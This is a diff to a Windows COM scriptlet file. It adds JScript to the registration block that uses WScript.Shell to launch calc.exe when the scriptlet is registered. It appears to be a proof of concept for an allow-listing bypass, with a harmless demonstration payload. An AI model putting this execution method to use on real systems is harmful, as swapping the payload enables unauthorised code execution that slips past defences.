@@ -2,10 +2,12 @@
 <scriptlet>
 <registration
     progid="BOB"
-    classid="{11111111-0000-0000-3000-000DA00DABFC}" >
+    classid="{B0BB0B00-0000-0000-3000-000DA00DABFC}" >
     <script language="JScript">
         <![CDATA[
-          var foo = new ActiveXObject("WScript.Shell"); 
+          var foo = new ActiveXObject("WScript.Shell");
+          var program = "calc.exe";
+          var reVal = foo.run(program);
         ]]>
     </script>
 </registration>
